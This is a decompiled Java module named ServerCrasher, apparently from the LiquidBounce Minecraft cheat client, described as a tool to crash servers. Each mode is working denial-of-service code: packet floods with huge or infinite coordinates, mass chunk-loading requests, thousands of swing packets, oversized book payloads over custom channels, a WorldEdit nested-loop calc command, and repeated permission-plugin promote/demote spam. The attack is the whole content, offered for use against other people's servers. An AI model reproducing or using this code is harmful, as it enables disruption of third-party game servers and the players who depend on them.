package net.ccbluex.liquidbounce.features.module.modules.exploit;

import io.netty.buffer.ByteBuf;
import io.netty.buffer.Unpooled;
import java.util.Random;
import kotlin.Metadata;
import kotlin.TypeCastException;
import kotlin.jvm.internal.DoubleCompanionObject;
import kotlin.jvm.internal.Intrinsics;
import net.ccbluex.liquidbounce.LiquidBounce;
import net.ccbluex.liquidbounce.api.IClassProvider;
import net.ccbluex.liquidbounce.api.enums.ItemType;
import net.ccbluex.liquidbounce.api.minecraft.client.entity.IEntityPlayerSP;
import net.ccbluex.liquidbounce.api.minecraft.item.IItemStack;
import net.ccbluex.liquidbounce.api.minecraft.nbt.INBTTagCompound;
import net.ccbluex.liquidbounce.api.minecraft.nbt.INBTTagList;
import net.ccbluex.liquidbounce.api.network.IPacketBuffer;
import net.ccbluex.liquidbounce.event.EventState;
import net.ccbluex.liquidbounce.event.EventTarget;
import net.ccbluex.liquidbounce.event.MotionEvent;
import net.ccbluex.liquidbounce.event.TickEvent;
import net.ccbluex.liquidbounce.event.WorldEvent;
import net.ccbluex.liquidbounce.features.module.Module;
import net.ccbluex.liquidbounce.features.module.ModuleCategory;
import net.ccbluex.liquidbounce.features.module.ModuleInfo;
import net.ccbluex.liquidbounce.utils.MinecraftInstance;
import net.ccbluex.liquidbounce.utils.misc.RandomUtils;
import net.ccbluex.liquidbounce.utils.timer.MSTimer;
import net.ccbluex.liquidbounce.value.ListValue;
import org.jetbrains.annotations.NotNull;
import org.jetbrains.annotations.Nullable;

/* compiled from: ServerCrasher.kt */
@Metadata(m24mv = {1, 1, 16}, m25bv = {1, 0, 3}, m23k = 1, m26d1 = {"\ufffd\ufffd:\n\u0002\u0018\u0002\n\u0002\u0018\u0002\n\u0002\b\u0002\n\u0002\u0018\u0002\n\ufffd\ufffd\n\u0002\u0018\u0002\n\ufffd\ufffd\n\u0002\u0010\u000e\n\u0002\b\u0003\n\u0002\u0010\u0002\n\u0002\b\u0002\n\u0002\u0018\u0002\n\ufffd\ufffd\n\u0002\u0018\u0002\n\ufffd\ufffd\n\u0002\u0018\u0002\n\ufffd\ufffd\b\u0007\u0018\ufffd\ufffd2\u00020\u0001B\u0005\u00a2\u0006\u0002\u0010\u0002J\b\u0010\u000b\u001a\u00020\fH\u0016J\u0010\u0010\r\u001a\u00020\f2\u0006\u0010\u000e\u001a\u00020\u000fH\u0007J\u0012\u0010\u0010\u001a\u00020\f2\b\u0010\u000e\u001a\u0004\u0018\u00010\u0011H\u0007J\u0010\u0010\u0012\u001a\u00020\f2\u0006\u0010\u000e\u001a\u00020\u0013H\u0007R\u000e\u0010\u0003\u001a\u00020\u0004X\u0082\u0004\u00a2\u0006\u0002\n\ufffd\ufffdR\u000e\u0010\u0005\u001a\u00020\u0006X\u0082\u0004\u00a2\u0006\u0002\n\ufffd\ufffdR\u0014\u0010\u0007\u001a\u00020\b8VX\u0096\u0004\u00a2\u0006\u0006\u001a\u0004\b\t\u0010\n\u00a8\u0006\u0014"}, m27d2 = {"Lnet/ccbluex/liquidbounce/features/module/modules/exploit/ServerCrasher;", "Lnet/ccbluex/liquidbounce/features/module/Module;", "()V", "modeValue", "Lnet/ccbluex/liquidbounce/value/ListValue;", "pexTimer", "Lnet/ccbluex/liquidbounce/utils/timer/MSTimer;", "tag", "", "getTag", "()Ljava/lang/String;", "onEnable", "", "onMotion", "event", "Lnet/ccbluex/liquidbounce/event/MotionEvent;", "onTick", "Lnet/ccbluex/liquidbounce/event/TickEvent;", "onWorld", "Lnet/ccbluex/liquidbounce/event/WorldEvent;", LiquidBounce.CLIENT_NAME})
@ModuleInfo(name = "ServerCrasher", description = "Allows you to crash certain server.", category = ModuleCategory.EXPLOIT)
/* loaded from: L-out.jar:net/ccbluex/liquidbounce/features/module/modules/exploit/ServerCrasher.class */
public final class ServerCrasher extends Module {
    private final ListValue modeValue = new ListValue("Mode", new String[]{"Book", "Swing", "MassiveChunkLoading", "WorldEdit", "Pex", "CubeCraft", "AACNew", "AACOther", "AACOld"}, "Book");
    private final MSTimer pexTimer = new MSTimer();

    public void onEnable() {
        IEntityPlayerSP thePlayer = MinecraftInstance.f157mc.getThePlayer();
        if (thePlayer == null) {
            return;
        }
        String str = (String) this.modeValue.get();
        if (str == null) {
            throw new TypeCastException("null cannot be cast to non-null type java.lang.String");
        }
        String lowerCase = str.toLowerCase();
        Intrinsics.checkExpressionValueIsNotNull(lowerCase, "(this as java.lang.String).toLowerCase()");
        switch (lowerCase.hashCode()) {
            case -1425299843:
                if (lowerCase.equals("aacnew")) {
                    for (int index = 0; index < 9999; index++) {
                        MinecraftInstance.f157mc.getNetHandler().addToSendQueue(MinecraftInstance.classProvider.createCPacketPlayerPosition(thePlayer.getPosX() + (9412 * index), thePlayer.getEntityBoundingBox().getMinY() + (9412 * index), thePlayer.getPosZ() + (9412 * index), true));
                    }
                    return;
                }
                return;
            case -1425298684:
                if (lowerCase.equals("aacold")) {
                    MinecraftInstance.f157mc.getNetHandler().addToSendQueue(MinecraftInstance.classProvider.createCPacketPlayerPosition(DoubleCompanionObject.INSTANCE.getNEGATIVE_INFINITY(), DoubleCompanionObject.INSTANCE.getNEGATIVE_INFINITY(), DoubleCompanionObject.INSTANCE.getNEGATIVE_INFINITY(), true));
                    return;
                }
                return;
            case -1031473397:
                if (lowerCase.equals("cubecraft")) {
                    thePlayer.setPosition(thePlayer.getPosX(), thePlayer.getPosY() + 0.3d, thePlayer.getPosZ());
                    return;
                }
                return;
            case -11181677:
                if (lowerCase.equals("massivechunkloading")) {
                    double posY = thePlayer.getPosY();
                    while (true) {
                        double yPos = posY;
                        if (yPos < 255) {
                            MinecraftInstance.f157mc.getNetHandler().addToSendQueue(MinecraftInstance.classProvider.createCPacketPlayerPosition(thePlayer.getPosX(), yPos, thePlayer.getPosZ(), true));
                            posY = yPos + 5.0d;
                        } else {
                            int i = 0;
                            while (true) {
                                int i2 = i;
                                if (i2 < 6685) {
                                    MinecraftInstance.f157mc.getNetHandler().addToSendQueue(MinecraftInstance.classProvider.createCPacketPlayerPosition(thePlayer.getPosX() + i2, 255.0d, thePlayer.getPosZ() + i2, true));
                                    i = i2 + 5;
                                } else {
                                    return;
                                }
                            }
                        }
                    }
                } else {
                    return;
                }
            case 382777517:
                if (lowerCase.equals("aacother")) {
                    for (int index2 = 0; index2 < 9999; index2++) {
                        MinecraftInstance.f157mc.getNetHandler().addToSendQueue(MinecraftInstance.classProvider.createCPacketPlayerPosition(thePlayer.getPosX() + (500000 * index2), thePlayer.getEntityBoundingBox().getMinY() + (500000 * index2), thePlayer.getPosZ() + (500000 * index2), true));
                    }
                    return;
                }
                return;
            case 1123315868:
                if (lowerCase.equals("worldedit")) {
                    thePlayer.sendChatMessage("//calc for(i=0;i<256;i++){for(a=0;a<256;a++){for(b=0;b<256;b++){for(c=0;c<256;c++){}}}}");
                    return;
                }
                return;
            default:
                return;
        }
    }

    /* JADX WARN: Failed to restore switch over string. Please report as a decompilation issue */
    @EventTarget
    public final void onMotion(@NotNull MotionEvent event) {
        Intrinsics.checkParameterIsNotNull(event, "event");
        IEntityPlayerSP thePlayer = MinecraftInstance.f157mc.getThePlayer();
        if (event.getEventState() == EventState.POST || thePlayer == null) {
            return;
        }
        String str = (String) this.modeValue.get();
        if (str == null) {
            throw new TypeCastException("null cannot be cast to non-null type java.lang.String");
        }
        String lowerCase = str.toLowerCase();
        Intrinsics.checkExpressionValueIsNotNull(lowerCase, "(this as java.lang.String).toLowerCase()");
        switch (lowerCase.hashCode()) {
            case -1031473397:
                if (lowerCase.equals("cubecraft")) {
                    double x = thePlayer.getPosX();
                    double y = thePlayer.getPosY();
                    double z = thePlayer.getPosZ();
                    for (int i = 0; i < 3000; i++) {
                        MinecraftInstance.f157mc.getNetHandler().addToSendQueue(MinecraftInstance.classProvider.createCPacketPlayerPosition(x, y + 0.09999999999999d, z, false));
                        MinecraftInstance.f157mc.getNetHandler().addToSendQueue(MinecraftInstance.classProvider.createCPacketPlayerPosition(x, y, z, true));
                    }
                    thePlayer.setMotionY(0.0d);
                    return;
                }
                break;
            case 110883:
                if (lowerCase.equals("pex")) {
                    if (this.pexTimer.hasTimePassed(2000L)) {
                        thePlayer.sendChatMessage(new Random().nextBoolean() ? "/pex promote a a" : "/pex demote a a");
                        this.pexTimer.reset();
                        return;
                    }
                    return;
                }
                break;
            case 3029737:
                if (lowerCase.equals("book")) {
                    IItemStack bookStack = MinecraftInstance.classProvider.createItemStack(MinecraftInstance.classProvider.getItemEnum(ItemType.WRITABLE_BOOK));
                    INBTTagCompound bookCompound = MinecraftInstance.classProvider.createNBTTagCompound();
                    bookCompound.setString("author", RandomUtils.INSTANCE.randomNumber(20));
                    bookCompound.setString("title", RandomUtils.INSTANCE.randomNumber(20));
                    INBTTagList pageList = MinecraftInstance.classProvider.createNBTTagList();
                    String pageText = RandomUtils.INSTANCE.randomNumber(600);
                    for (int i2 = 0; i2 <= 49; i2++) {
                        pageList.appendTag(MinecraftInstance.classProvider.createNBTTagString(pageText));
                    }
                    bookCompound.setTag("pages", pageList);
                    bookStack.setTagCompound(bookCompound);
                    for (int i3 = 0; i3 <= 99; i3++) {
                        IClassProvider iClassProvider = MinecraftInstance.classProvider;
                        ByteBuf byteBufBuffer = Unpooled.buffer();
                        Intrinsics.checkExpressionValueIsNotNull(byteBufBuffer, "Unpooled.buffer()");
                        IPacketBuffer packetBuffer = iClassProvider.createPacketBuffer(byteBufBuffer);
                        packetBuffer.writeItemStackToBuffer(bookStack);
                        MinecraftInstance.f157mc.getNetHandler().addToSendQueue(MinecraftInstance.classProvider.createCPacketCustomPayload(new Random().nextBoolean() ? "MC|BSign" : "MC|BEdit", packetBuffer));
                    }
                    return;
                }
                break;
            case 109854462:
                if (lowerCase.equals("swing")) {
                    for (int i4 = 0; i4 < 5000; i4++) {
                        MinecraftInstance.f157mc.getNetHandler().addToSendQueue(MinecraftInstance.classProvider.createCPacketAnimation());
                    }
                    return;
                }
                break;
        }
        setState(false);
    }

    @EventTarget
    public final void onWorld(@NotNull WorldEvent event) {
        Intrinsics.checkParameterIsNotNull(event, "event");
        if (event.getWorldClient() == null) {
            setState(false);
        }
    }

    @EventTarget
    public final void onTick(@Nullable TickEvent event) {
        if (MinecraftInstance.f157mc.getThePlayer() == null || MinecraftInstance.f157mc.getTheWorld() == null) {
            setState(false);
        }
    }

    @NotNull
    public String getTag() {
        return (String) this.modeValue.get();
    }
}
